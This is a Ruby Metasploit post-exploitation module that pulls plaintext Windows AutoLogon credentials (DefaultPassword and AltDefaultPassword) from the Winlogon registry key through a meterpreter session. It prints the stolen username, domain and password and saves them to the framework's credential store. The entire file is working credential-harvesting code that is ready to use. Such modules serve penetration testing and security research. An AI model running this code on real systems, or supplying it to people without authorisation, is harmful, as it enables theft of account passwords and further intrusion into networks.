##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Windows Gather AutoLogin User Credential Extractor',
        'Description'   => %q{
          This module extracts the plain-text Windows user login password in Registry.
          It exploits a Windows feature that Windows (2000 to 2008 R2) allows a
          user or third-party Windows Utility tools to configure User AutoLogin via
          plain-text password insertion in (Alt)DefaultPassword field in the registry
          location - HKLM\\Software\\Microsoft\\Windows NT\\WinLogon. This is readable
          by all users.
        },
        'License'       => MSF_LICENSE,
        'Author'        =>
          [
            'Myo Soe' #YGN Ethical Hacker Group, http://yehg.net
          ],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ],
        'References'     =>
        [
          [ 'URL', 'http://support.microsoft.com/kb/315231' ],
          [ 'URL', 'http://core.yehg.net/lab/#tools.exploits' ]
        ]
    ))
  end


  def run

    host_name = sysinfo['Computer']
    print_status("Running against #{host_name} on session #{datastore['SESSION']}")

    creds = []

    has_al = 0

    logon_key = "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\"
    al = registry_getvaldata(logon_key, "AutoAdminLogon")        || ''

    do1 = registry_getvaldata(logon_key, "DefaultDomainName")    || ''
    du1 = registry_getvaldata(logon_key, "DefaultUserName")      || ''
    dp1 = registry_getvaldata(logon_key, "DefaultPassword")      || ''

    do2 = registry_getvaldata(logon_key, "AltDefaultDomainName") || ''
    du2 = registry_getvaldata(logon_key, "AltDefaultUserName")   || ''
    dp2 = registry_getvaldata(logon_key, "AltDefaultPassword")   || ''

    if do1 != '' && du1 != '' && (dp1 != '' || (dp1 == '' && al == '1'))
      has_al = 1
      creds << [du1, dp1, do1]
      print_good("AutoAdminLogon=#{al}, DefaultDomain=#{do1}, DefaultUser=#{du1}, DefaultPassword=#{dp1}")
    end

    if do2 != '' && du2 != '' && (dp2 != '' || (dp2 == '' && al == '1'))
      has_al = 1
      creds << [du2, dp2, do2]
      print_good("AutoAdminLogon=#{al}, AltDomain=#{do2}, AltUser=#{du2}, AltPassword=#{dp2}")
    end

    if has_al == 0
      print_status("The Host #{host_name} is not configured to have AutoLogon password")
      return
    end

    creds.each do |cred|
      create_credential(
        workspace_id: myworkspace_id,
        origin_type: :session,
        session_id: session_db_id,
        post_reference_name: self.refname,
        username: cred[0],
        private_data: cred[1],
        private_type: :password,
        realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
        realm_value: cred[2]
      )
    end
  end
end
